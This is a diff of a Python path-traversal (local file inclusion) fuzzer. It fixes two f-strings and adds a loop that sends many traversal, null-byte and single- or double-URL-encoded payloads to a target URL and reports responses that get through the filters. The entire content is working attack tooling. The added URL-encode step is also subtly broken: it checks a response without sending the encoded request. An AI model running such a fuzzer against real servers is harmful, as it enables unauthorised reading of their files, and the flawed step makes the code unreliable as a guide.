@@ -73,7 +73,7 @@ def lfi(url, payload, hcode=(), hsize=(), depth=5):
             # DOUBLE URLENCODE
             resp = requests.get(f"{url}{quote_plus(quote_plus(p))}", headers=USER_AGENT, allow_redirects=False)
             if resp.status_code not in hcode and len(resp.content) not in hsize:
-            	print(good_code(resp.status_code, f"{{quote_plus(quote_plus(p))} [code:{resp.status_code} size:{len(resp.content)}]"))
+            	print(good_code(resp.status_code, f"{quote_plus(quote_plus(p))} [code:{resp.status_code} size:{len(resp.content)}]"))
             resp = requests.get(f"{url}{quote_plus(quote_plus(p))}%00", headers=USER_AGENT, allow_redirects=False)
             if resp.status_code not in hcode and len(resp.content) not in hsize:
             	print(good_code(resp.status_code, f"{quote_plus(quote_plus(p))}%00 [code:{resp.status_code} size:{len(resp.content)}]"))
@@ -112,12 +112,51 @@ def lfi(url, payload, hcode=(), hsize=(), depth=5):
                 # DOUBLE URLENCODE
                 resp = requests.get(f"{url}{quote_plus(quote_plus(p))}", headers=USER_AGENT, allow_redirects=False)
                 if resp.status_code not in hcode and len(resp.content) not in hsize:
-                	print(good_code(resp.status_code, f"{{quote_plus(quote_plus(p))} [code:{resp.status_code} size:{len(resp.content)}]"))
+                	print(good_code(resp.status_code, f"{quote_plus(quote_plus(p))} [code:{resp.status_code} size:{len(resp.content)}]"))
                 resp = requests.get(f"{url}{quote_plus(quote_plus(p))}%00", headers=USER_AGENT, allow_redirects=False)
                 if resp.status_code not in hcode and len(resp.content) not in hsize:
                 	print(good_code(resp.status_code, f"{quote_plus(quote_plus(p))}%00 [code:{resp.status_code} size:{len(resp.content)}]"))
             dds += DDS
         ds += DS
+
+    ds = DS
+    for _ in range(depth):
+        ds = DS
+        for _ in range(depth):
+            payloads_two = [f"{ds}{payload}{dds}",
+                            f"{dds}{payload}{ds}",                                                        
+                            f"{dds}{ds}{payload}{ds}",
+                            f"{ds}{dds}{payload}{ds}",
+                            f"{dds}{ds}{payload}{dds}",
+                            f"{ds}{dds}{payload}{dds}",
+                            f"{ds}{payload}/{dds}",
+                            f"{dds}{payload}/{ds}",                                                        
+                            f"{dds}{ds}{payload}/{ds}",
+                            f"{ds}{dds}{payload}/{ds}",
+                            f"{dds}{ds}{payload}/{dds}",
+                            f"{ds}{dds}{payload}/{dds}"]
+            for p in payloads_two:
+                resp = requests.get(f"{url}{p}", headers=USER_AGENT, allow_redirects=False)
+                if resp.status_code not in hcode and len(resp.content) not in hsize:
+                    print(good_code(resp.status_code, f"{p} [code:{resp.status_code} size:{len(resp.content)}]"))
+                resp = requests.get(f"{url}{p}%00", headers=USER_AGENT, allow_redirects=False)
+                if resp.status_code not in hcode and len(resp.content) not in hsize:
+                    print(good_code(resp.status_code, f"{p}%00 [code:{resp.status_code} size:{len(resp.content)}]"))
+                # URLENCODE
+                if resp.status_code not in hcode and len(resp.content) not in hsize:
+                	print(good_code(resp.status_code, f"{quote_plus(p)} [code:{resp.status_code} size:{len(resp.content)}]"))
+                resp = requests.get(f"{url}{quote_plus(p)}%00", headers=USER_AGENT, allow_redirects=False)
+                if resp.status_code not in hcode and len(resp.content) not in hsize:
+                	print(good_code(resp.status_code, f"{quote_plus(p)}%00 [code:{resp.status_code} size:{len(resp.content)}]"))
+                # DOUBLE URLENCODE
+                resp = requests.get(f"{url}{quote_plus(quote_plus(p))}", headers=USER_AGENT, allow_redirects=False)
+                if resp.status_code not in hcode and len(resp.content) not in hsize:
+                	print(good_code(resp.status_code, f"{quote_plus(quote_plus(p))} [code:{resp.status_code} size:{len(resp.content)}]"))
+                resp = requests.get(f"{url}{quote_plus(quote_plus(p))}%00", headers=USER_AGENT, allow_redirects=False)
+                if resp.status_code not in hcode and len(resp.content) not in hsize:
+                	print(good_code(resp.status_code, f"{quote_plus(quote_plus(p))}%00 [code:{resp.status_code} size:{len(resp.content)}]"))
+            ds += DS
+        dds += DDS
 
     ds = DS
     for _ in range(depth):
